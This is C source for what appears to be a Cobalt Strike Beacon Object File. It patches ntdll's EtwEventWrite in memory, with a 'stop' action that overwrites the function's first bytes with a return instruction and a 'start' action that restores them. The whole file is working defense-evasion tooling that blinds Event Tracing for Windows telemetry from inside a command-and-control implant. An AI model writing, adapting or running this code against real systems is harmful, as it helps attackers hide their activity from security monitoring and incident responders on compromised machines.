#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict _Dst,const void * __restrict _Src,size_t _MaxCount);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect (PVOID, DWORD, DWORD, PDWORD);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *_Str1,const char *_Str2);


void go(char *args, int len) {
	datap parser;
	char * action;
	char * moduleName = "ntdll.dll";
	char * functionName = "EtwEventWrite";
	unsigned char buf[8];
	SIZE_T bRead = 0;
	BOOL result = FALSE;
	
	FARPROC module = NULL;
	FARPROC funcAddress = NULL;
	
	BeaconDataParse(&parser, args, len);
	action = BeaconDataExtract(&parser, NULL);
	
	module = KERNEL32$LoadLibraryA((LPCSTR)moduleName);
	
	if (module != NULL)
	{
		funcAddress = KERNEL32$GetProcAddress((HMODULE)module, (LPCSTR)functionName);
		if (funcAddress != NULL)
		{	
			char * startbytes;
			char * stopbytes;
			char * patchbytes;
			int numByteToPatch;

			#ifndef _X86_
			numByteToPatch = 1;
			startbytes = "\x4c";
			stopbytes = "\xc3";
			BeaconPrintf(CALLBACK_OUTPUT, "Action: %s\nWorking with 64-bit.", action);
			#else
			numByteToPatch = 4;
			startbytes = "\x8b\xff\x55\x00";
			stopbytes = "\xc2\x14\x00\x00";
			BeaconPrintf(CALLBACK_OUTPUT, "Action: %s\nWorking with 32-bit.", action);
			#endif

			if(MSVCRT$strcmp(action, "start") == 0){
				patchbytes = startbytes;
			}else if(MSVCRT$strcmp(action, "stop") == 0){
				patchbytes = stopbytes;
			}

			DWORD oldProt;
			KERNEL32$VirtualProtect(funcAddress, 4, PAGE_EXECUTE_READWRITE, &oldProt);
			
			MSVCRT$memcpy(funcAddress, patchbytes, numByteToPatch);

			DWORD oldOldProt;
			KERNEL32$VirtualProtect(funcAddress, 4, oldProt, &oldOldProt);

			result = KERNEL32$ReadProcessMemory(KERNEL32$GetCurrentProcess(), funcAddress, buf, sizeof(buf), &bRead);
			if (result)
			{
				int i = 0;
				for (i = 0; i  < numByteToPatch; i++)
				{
					BeaconPrintf(CALLBACK_OUTPUT, "%x", buf[i]);
				}

			} else {
				BeaconPrintf(CALLBACK_ERROR, "ReadProcessMemory failed\n");
			}
		} else {
		BeaconPrintf(CALLBACK_ERROR, "Failed to find function address\n");
	}
		
	} else {
		BeaconPrintf(CALLBACK_ERROR, "Could not load library\n");
	}
}